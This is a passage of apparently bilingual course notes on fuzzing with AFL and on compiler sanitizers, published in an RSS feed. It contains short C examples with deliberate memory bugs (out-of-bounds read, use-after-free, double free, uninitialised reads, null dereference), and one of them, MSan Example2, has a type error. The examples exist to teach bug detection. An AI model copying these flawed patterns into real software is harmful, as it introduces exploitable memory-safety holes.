&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When the cycles counter is blue
&lt;ul&gt;
&lt;li&gt;Last new path was found over a cycle ago&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If you want to stop earlier, press Ctrl-C
&lt;ul&gt;
&lt;li&gt;E.g. it’s been running for a while (hours + millions of executions + at least 2 cycles&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;AFL Output&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;File  &lt;code&gt;fuzzer_stats&lt;/code&gt;  provides summary of stats UI&lt;/li&gt;
&lt;li&gt;File  &lt;code&gt;plot_data&lt;/code&gt;  shows the progress of fuzzer&lt;/li&gt;
&lt;li&gt;Directory  &lt;code&gt;queue&lt;/code&gt;  shows inputs that led to paths&lt;/li&gt;
&lt;li&gt;Directory  &lt;code&gt;crashes&lt;/code&gt;  contains input that caused crash&lt;/li&gt;
&lt;li&gt;Directory  &lt;code&gt;hangs&lt;/code&gt;  contains input that caused hang&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;AFL Crashes&lt;br&gt;
Unique if the associated execution paths involve any state transitions not seen previously. A single bug may be reached in multiple ways, but AFL can usually recognise&lt;br&gt;
Crashes may be caused by failed assertions - as they abort&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;Compiler-supported sanitizers&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Compiler-supported sanitizers&#34;&gt;#&lt;/a&gt;Compiler-supported sanitizers&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Sanitisers 和加固措施&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Sanitisers（内存清理器）：通过在二进制文件中插入额外的代码，检查不良的运行条件。提高模糊测试效果。&lt;/li&gt;
&lt;li&gt;Common compiler-supported sanitisers: ASan, MSan, UBSan, TSan&lt;/li&gt;
&lt;li&gt;加固选项：使内存错误的检测更容易。 &lt;code&gt;AFL_HARDEN=1&lt;/code&gt; ：AFL 的硬化选项，用于检测更多的内存错误。&lt;/li&gt;
&lt;li&gt;注意：Sanitisers 通常不兼容，因此建议：
&lt;ul&gt;
&lt;li&gt;大多数模糊测试运行时启用  &lt;code&gt;AFL_HARDEN&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;小部分测试运行时分别启用每个 Sanitisers，以覆盖不同类型的内存错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;ASan（Address Sanitizer）Compile with  &lt;code&gt;-fsanitize=address&lt;/code&gt; &lt;br&gt;
 检测内容：
&lt;ul&gt;
&lt;li&gt;堆、栈和全局变量的越界访问。&lt;/li&gt;
&lt;li&gt;Use-after-free、double-free、invalid free。&lt;/li&gt;
&lt;li&gt;内存泄漏。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;性能影响：大约 2 倍的运行时间开销。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;ASan Example1&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; N 10 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; s[N] = &lt;span class=&#34;string&#34;&gt;&amp;quot;123456789&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= N; i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%c&amp;quot;&lt;/span&gt;, s[i]); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Loop bound goes past the end of the array, cannot assess  &lt;code&gt;s[10]&lt;/code&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;ASan Example2&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *a = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;) * &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(a); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; a[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The array is dereferenced after it is free&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;ASan Example3&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *s = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;) * &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(s); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The array is double-freed&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;MSan（Memory Sanitizer） Compile with  &lt;code&gt;-fsanitize=memory&lt;/code&gt; &lt;br&gt;
 检测未初始化的内存使用。&lt;br&gt;
性能影响：大约 3 倍的运行时间开销。&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;MSan Example1&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     a[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (a[argc]) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;print something\n&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The array is allocated on &lt;strong&gt;stack&lt;/strong&gt;, but only partially initialised&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;MSan Example2&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;) * &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     a[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (a[argc]) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;print something\n&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(a); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The array is allocated on &lt;strong&gt;heap&lt;/strong&gt;, but only partially initialised&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;UBSan（Undefined Behavior Sanitizer） Compile with  &lt;code&gt;-fsanitize=undefined&lt;/code&gt; &lt;br&gt;
 检测：
&lt;ul&gt;
&lt;li&gt;解引用空指针。&lt;/li&gt;
&lt;li&gt;有符号整数溢出。&lt;br&gt;
性能影响：大约 20% 的运行时间开销。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;UBSan Example1&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n = &lt;span class=&#34;number&#34;&gt;65&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; m = n / (n - n); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Division-by-zero is undefined&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;UBSan Example2&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;foo&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt; &amp;#123;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a, b; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;foo&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;x&lt;/span&gt; =&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; m = x-&amp;gt;a;  &lt;span class=&#34;comment&#34;&gt;// 访问空指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Accessing a null pointer is undefined&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;TSan（Thread Sanitizer）&lt;br&gt;
检测数据竞争（data races）。&lt;br&gt;
性能影响：运行时间开销约为 5-15 倍，内存开销约为 5-10 倍。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;Others&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Others&#34;&gt;#&lt;/a&gt;Others&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Parallel Fuzzing(High performance fuzzing)&lt;br&gt;
Run concurrent fuzzing jobs on multicore systems&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;One master instance, one slave per core&lt;/li&gt;
&lt;li&gt;Use the afl-gotcpu tool to measure per-core pre-emption rate&lt;br&gt;
Run the master (-M) like this:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01&lt;/code&gt; &lt;br&gt;
Then, run the slaves (-S) instances like this:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Fuzzer Dictionaries(Improve fuzzer mutations)&lt;br&gt;
By default, AFL mutation engine is optimised for compact data formats&lt;br&gt;
Custom dictionaries can help the fuzzer access paths it otherwise wouldn’t  &lt;code&gt;afl-fuzz -x mydict&lt;/code&gt; &lt;br&gt;
Get them from:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dictionaries&lt;/code&gt;  directory in AFL&lt;/li&gt;
&lt;li&gt;&lt;code&gt;libtokencap&lt;/code&gt;  directory in AFL
&lt;ul&gt;
&lt;li&gt;Create a dictionary by intercepting calls like  &lt;code&gt;strcmp&lt;/code&gt;  and  &lt;code&gt;memcmp&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaHJvbWl1bS5nb29nbGVzb3VyY2UuY29tL2Nocm9taXVtL3NyYy8rL21hc3Rlci90ZXN0aW5nL2xpYmZ1enplci9mdXp6ZXJzL2RpY3Rz&#34;&gt;Online resource&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Limitations of Fuzzing&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Hard to tell when to stop&lt;/li&gt;
&lt;li&gt;Test the target in the exact configuration you provided, on the input source you set up&lt;/li&gt;
&lt;li&gt;Can get stuck (e.g. checksums)&lt;/li&gt;
&lt;li&gt;Crashes only (typical of most fuzzers). Only notice problems that can be automatically detected&lt;/li&gt;
&lt;li&gt;Need to build target from source&lt;/li&gt;
&lt;li&gt;stdin or file input only&lt;/li&gt;
&lt;li&gt;Coverage-based instrumentation won’t guide it towards all crashes
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;x = 1/(input – 1234)&lt;/code&gt;  ：在这种情况下，AFL 可能难以找到输入 1234，从而导致无法检测到除零错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No automatic parallelisation&lt;/li&gt;
&lt;li&gt;Linux/macOS only&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;libFuzzer: Guided Fuzzing for APIs&lt;br&gt;
The other top general purpose fuzzer
&lt;ul&gt;
&lt;li&gt;Use similar algorithms to AFL&lt;/li&gt;
&lt;li&gt;Build it with special compiler instrumentation (LLVM)&lt;br&gt;
Targets functions rather than programs&lt;/li&gt;
&lt;li&gt;Testers have to write a harness&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/Fuzz-testing/</guid>
            <title>Fuzz testing</title>
            <link>http://example.com/course/Fuzz-testing/</link>
            <category>software security</category>
            <pubDate>Sun, 27 Oct 2024 18:28:09 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Software testing&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Software testing&#34;&gt;#&lt;/a&gt; Software testing&lt;/h1&gt;
&lt;h2 id=&#34;Definition&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Definition&#34;&gt;#&lt;/a&gt;Definition&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;The process of running a program to evaluate properties of interest&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Meet design requirements&lt;/li&gt;
&lt;li&gt;Produce correct results&lt;/li&gt;
&lt;li&gt;Perform within an acceptable time&lt;/li&gt;
&lt;li&gt;Reasonably usable&lt;/li&gt;
&lt;li&gt;Handle all inputs correctly&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Software Testing Steps&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;验证（Verification）：我们是否在正确地构建产品？&lt;br&gt;
任务集确保软件正确地实现了特定功能。&lt;br&gt;
验证的目标是确保程序在所有可能的输入下都能正常工作。&lt;/li&gt;
&lt;li&gt;确认（Validation）：我们是否在构建正确的产品？&lt;br&gt;
任务集确保软件符合客户需求。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Test Oracles&lt;br&gt;
